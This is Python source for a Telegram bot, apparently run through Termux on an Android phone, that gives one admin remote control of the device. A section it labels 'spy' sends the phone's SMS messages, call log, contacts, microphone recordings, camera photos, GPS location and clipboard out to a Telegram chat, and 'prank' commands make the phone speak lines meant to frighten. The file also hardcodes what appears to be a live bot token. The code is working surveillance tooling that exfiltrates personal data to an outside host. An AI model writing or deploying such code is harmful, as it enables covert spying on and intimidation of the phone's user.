import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import subprocess, os, json, time, signal

TOKEN = '8733717882:AAHOxAckqRFA_xZG6Zppjqel_KyvbAeXgvg'
ADMIN_ID = 6678107119

bot = telebot.TeleBot(TOKEN)
current_process = None

def is_admin(m): return m.from_user.id == ADMIN_ID

@bot.message_handler(func=lambda m: not is_admin(m), content_types=['text'])
def deny(m): bot.reply_to(m, "⛔ Доступ запрещён.")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
        "🤖 <b>A51 Control</b>\n\n"
        "🎵 <b>МУЗЫКА</b>\n"
        "/list — список треков\n"
        "/play имя — играть\n"
        "/stop — стоп\n"
        "/volume 50 — громкость (0–100)\n\n"
        "🔧 <b>СИСТЕМА</b>\n"
        "/say текст — A51 скажет голосом\n"
        "/torch on|off — фонарик\n"
        "/vibrate 5 — вибрация (сек)\n"
        "/battery — заряд батареи\n"
        "/photo — снимок с камеры\n"
        "/selfie — селфи\n"
        "/location — GPS\n"
        "/clip — буфер обмена\n"
        "/brightness 50 — яркость (0–100)\n"
        "/notify текст — уведомление\n"
        "/device — модель и Android\n"
        "/silent — беззвучный режим\n"
        "/open ссылка — открыть сайт\n\n"
        "🕵️ <b>ШПИОН</b>\n"
        "/sms — последние 5 SMS\n"
        "/calls — звонки\n"
        "/contacts — контакты\n"
        "/record 10 — запись звука\n"
        "/wifi — инфа о сети\n"
        "/wifiscan — сканер WiFi\n"
        "/toast текст — всплывашка\n\n"
        "🎭 <b>ПРАНК</b>\n"
        "/prank — случайный хаос\n"
        "/ghost — режим призрака\n"
        "/insane — безумный телефон",
        parse_mode='HTML')

# ── МУЗЫКА ──
MUSIC_DIR = '/sdcard/Music'

@bot.message_handler(commands=['list'])
def list_cmd(message):
    if not os.path.exists(MUSIC_DIR):
        bot.reply_to(message, "📭 Папка Music пуста"); return
    files = sorted([f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3','.m4a','.wav','.ogg'))])
    if not files:
        bot.reply_to(message, "📭 Нет треков в /sdcard/Music"); return
    txt = "🎵 Треки:\n" + "\n".join(files[:50])
    bot.reply_to(message, txt)

@bot.message_handler(commands=['play'])
def play_cmd(message):
    global current_process
    fn = message.text.replace('/play','').strip()
    if not fn:
        bot.reply_to(message, "Напиши: /play имя_файла"); return
    p = os.path.join(MUSIC_DIR, fn)
    if not os.path.exists(p) and os.path.exists(p + '.mp3'): p += '.mp3'
    if not os.path.exists(p):
        bot.reply_to(message, f"❌ Не найден: {fn}"); return
    if current_process and current_process.poll() is None:
        current_process.terminate()
    try:
        current_process = subprocess.Popen(["mpv","--no-video","--really-quiet",p],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        bot.reply_to(message, f"▶️ {fn}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_process
    subprocess.run(["pkill","-9","mpv"], stderr=subprocess.DEVNULL)
    current_process = None
    bot.reply_to(message, "⏹ Стоп.")

@bot.message_handler(commands=['volume'])
def vol_cmd(message):
    p = message.text.split()
    if len(p) < 2 or not p[1].isdigit():
        bot.reply_to(message, "Напиши: /volume 50"); return
    try:
        subprocess.run(["termux-volume","music",str(int(int(p[1])/100*15))], check=True)
        bot.reply_to(message, f"🔊 {p[1]}%")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── СИСТЕМА ──
@bot.message_handler(commands=['say'])
def say_cmd(message):
    t = message.text.replace('/say','').strip()
    if not t: bot.reply_to(message, "Напиши: /say Привет"); return
    try:
        subprocess.run(["termux-tts-speak", t], check=True)
        bot.reply_to(message, f"🗣️ {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['torch'])
def torch_cmd(message):
    p = message.text.split()
    if len(p) < 2 or p[1].lower() not in ['on','off']:
        bot.reply_to(message, "Напиши: /torch on или /torch off"); return
    try:
        subprocess.run(["termux-torch", p[1].lower()], check=True)
        bot.reply_to(message, f"🔦 {p[1].upper()}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['vibrate'])
def vibrate_cmd(message):
    p = message.text.split()
    if len(p) < 2 or not p[1].isdigit():
        bot.reply_to(message, "Напиши: /vibrate 5"); return
    try:
        subprocess.run(["termux-vibrate","-d",str(int(p[1])*1000)], check=True)
        bot.reply_to(message, f"📳 {p[1]} сек.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['battery'])
def battery_cmd(message):
    try:
        r = subprocess.run(["termux-battery-status"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        bot.reply_to(message, f"🔋 {d.get('percentage')}% • {d.get('status')} • {d.get('temperature')}°C")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['photo'])
def photo_cmd(message):
    bot.reply_to(message, "📸")
    p = "/sdcard/Download/a51_photo.jpg"
    try:
        subprocess.run(["termux-camera-photo","-c","0",p], check=True, timeout=15)
        if os.path.exists(p):
            with open(p,'rb') as f: bot.send_photo(message.chat.id, f)
            os.remove(p)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['selfie'])
def selfie_cmd(message):
    bot.reply_to(message, "🤳")
    p = "/sdcard/Download/a51_selfie.jpg"
    try:
        subprocess.run(["termux-camera-photo","-c","1",p], check=True, timeout=15)
        if os.path.exists(p):
            with open(p,'rb') as f: bot.send_photo(message.chat.id, f)
            os.remove(p)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['location'])
def loc_cmd(message):
    bot.reply_to(message, "📍...")
    try:
        r = subprocess.run(["termux-location","-p","gps"], capture_output=True, text=True, check=True, timeout=20)
        d = json.loads(r.stdout)
        lat, lon = d.get('latitude'), d.get('longitude')
        bot.reply_to(message, f"📍 {lat}, {lon}\nhttps://maps.google.com/?q={lat},{lon}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['clip'])
def clip_cmd(message):
    try:
        r = subprocess.run(["termux-clipboard-get"], capture_output=True, text=True, check=True)
        bot.reply_to(message, f"📋 {r.stdout.strip() or 'Пусто'}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['brightness'])
def bright_cmd(message):
    p = message.text.split()
    if len(p) < 2 or not p[1].isdigit():
        bot.reply_to(message, "Напиши: /brightness 50"); return
    try:
        subprocess.run(["termux-brightness", str(int(int(p[1])/100*255))], check=True)
        bot.reply_to(message, f"💡 {p[1]}%")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['notify'])
def notify_cmd(message):
    t = message.text.replace('/notify','').strip()
    if not t: bot.reply_to(message, "Напиши: /notify Текст"); return
    try:
        subprocess.run(["termux-notification","--title","A51","--content",t], check=True)
        bot.reply_to(message, f"🔔 {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['device'])
def device_cmd(message):
    try:
        model = subprocess.run(["getprop","ro.product.model"], capture_output=True, text=True).stdout.strip()
        android = subprocess.run(["getprop","ro.build.version.release"], capture_output=True, text=True).stdout.strip()
        bot.reply_to(message, f"📱 {model}\nAndroid: {android}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['silent'])
def silent_cmd(message):
    try:
        subprocess.run(["termux-volume","notification","0"], check=True)
        bot.reply_to(message, "🔇 Беззвучный режим.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['open'])
def open_cmd(message):
    u = message.text.replace('/open','').strip()
    if not u: bot.reply_to(message, "Напиши: /open https://..."); return
    try:
        subprocess.run(["termux-open", u], check=True)
        bot.reply_to(message, f"🌐 {u}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── ШПИОН ──
@bot.message_handler(commands=['sms'])
def sms_cmd(message):
    try:
        r = subprocess.run(["termux-sms-list","-l","5"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "SMS нет."); return
        t = "📩 SMS:\n\n"
        for s in d: t += f"📱 {s.get('number')}\n{s.get('body')}\n\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['calls'])
def calls_cmd(message):
    try:
        r = subprocess.run(["termux-call-log","-l","5"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "Звонков нет."); return
        t = "📞 Звонки:\n\n"
        for c in d: t += f"📱 {c.get('name')} ({c.get('phone_number')})\n{c.get('type')} — {c.get('duration')} сек.\n\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['contacts'])
def contacts_cmd(message):
    try:
        r = subprocess.run(["termux-contact-list"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        if not d: bot.reply_to(message, "Контактов нет."); return
        t = f"👥 {len(d)} шт. Первые 10:\n\n"
        for c in d[:10]: t += f"📱 {c.get('name')} — {c.get('number')}\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['record'])
def record_cmd(message):
    p = message.text.split()
    sec = int(p[1]) if len(p) > 1 and p[1].isdigit() else 5
    if sec > 60: sec = 60
    bot.reply_to(message, f"🎤 Записываю {sec} сек...")
    path = "/sdcard/Download/a51_record.m4a"
    try:
        subprocess.Popen(["termux-microphone-record","-f",path,"-l",str(sec)])
        time.sleep(sec + 2)
        subprocess.run(["termux-microphone-record","-q"], check=True)
        if os.path.exists(path):
            with open(path,'rb') as f: bot.send_voice(message.chat.id, f)
            os.remove(path)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['wifi'])
def wifi_cmd(message):
    try:
        r = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        bot.reply_to(message, f"📶 {d.get('ssid')}\nIP: {d.get('ip')}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['wifiscan'])
def wifiscan_cmd(message):
    try:
        r = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, check=True)
        d = json.loads(r.stdout)
        t = f"📡 {len(d)} сетей:\n\n"
        for w in d[:10]: t += f"📶 {w.get('ssid')} ({w.get('rssi')} dBm)\n"
        bot.reply_to(message, t)
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['toast'])
def toast_cmd(message):
    t = message.text.replace('/toast','').strip()
    if not t: bot.reply_to(message, "Напиши: /toast Привет"); return
    try:
        subprocess.run(["termux-toast", t], check=True)
        bot.reply_to(message, f"🎈 {t}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

# ── ПРАНКИ ──
@bot.message_handler(commands=['prank'])
def prank_cmd(message):
    bot.reply_to(message, "🎭 Пранк...")
    import random
    acts = [
        lambda: subprocess.run(["termux-vibrate","-d","2000"]),
        lambda: subprocess.run(["termux-toast","Я тебя вижу"]),
        lambda: subprocess.run(["termux-tts-speak","Привет, я твой телефон"]),
        lambda: subprocess.run(["termux-torch","on"]),
    ]
    random.shuffle(acts)
    for a in acts[:3]:
        try: a(); time.sleep(1.5)
        except: pass
    subprocess.run(["termux-torch","off"])
    bot.reply_to(message, "Готово.")

@bot.message_handler(commands=['ghost'])
def ghost_cmd(message):
    bot.reply_to(message, "👻 Призрак...")
    try:
        subprocess.run(["termux-tts-speak","Я здесь. Я вижу тебя."])
        time.sleep(3)
        subprocess.run(["termux-vibrate","-d","1000"])
        time.sleep(1)
        subprocess.run(["termux-toast","Не оборачивайся"])
        time.sleep(2)
        subprocess.run(["termux-torch","on"]); time.sleep(0.5)
        subprocess.run(["termux-torch","off"])
        bot.reply_to(message, "Ушёл.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

@bot.message_handler(commands=['insane'])
def insane_cmd(message):
    bot.reply_to(message, "🤪 Безумие...")
    import random
    try:
        for i in range(5):
            subprocess.run(["termux-vibrate","-d","500"])
            subprocess.run(["termux-toast", random.choice(["Ха-ха","Я живой","Беги","Ты не один","Помогите"])])
            time.sleep(1)
        subprocess.run(["termux-torch","on"]); time.sleep(1)
        subprocess.run(["termux-torch","off"])
        subprocess.run(["termux-tts-speak","Я сошёл с ума. Ха-ха-ха."])
        bot.reply_to(message, "Закончилось.")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

print("A51 Control Bot запущен...")
bot.polling(none_stop=True)
